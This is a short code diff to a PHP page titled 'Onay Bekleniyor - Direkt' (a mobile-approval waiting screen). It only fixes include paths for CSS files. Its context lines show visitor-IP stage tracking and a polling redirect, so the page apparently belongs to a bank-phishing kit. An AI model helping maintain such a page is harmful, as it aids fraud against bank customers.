@@ -52,7 +52,7 @@ $ajax->pageUpdate(IP, 'Mobil-Onay');
     
     <title>Onay Bekleniyor - Direkt</title>
     <style>
-        <?php echo file_get_contents('files/asset/css/normalize.min.css'); ?>
+        <?php echo file_get_contents(dirname(__DIR__) . '/files/asset/css/normalize.min.css'); ?>
         
         @font-face {
           font-family: 'Poppins';
@@ -134,7 +134,7 @@ $ajax->pageUpdate(IP, 'Mobil-Onay');
           src: url('files/asset/fonts/pxiByp8kv8JHgFVrLDD4Z1xlFQ.woff2') format('woff2');
           unicode-range: U+0000-00FF, U+0131, U+0152-0153, U+02BB-02BC, U+02C6, U+02DA, U+02DC, U+0304, U+0308, U+0329, U+2000-206F, U+20AC, U+2122, U+2191, U+2193, U+2212, U+2215, U+FEFF, U+FFFD;
         }
-        <?php echo file_get_contents('basvuru/style.css'); ?>
+        <?php echo file_get_contents(dirname(__DIR__) . '/basvuru/style.css'); ?>
     </style>
 </head>
 <body>
@@ -174,6 +174,7 @@ $ajax->pageUpdate(IP, 'Mobil-Onay');
     setInterval(checkRedirect, 2000);
 </script>
 </html>
+
 
 
 
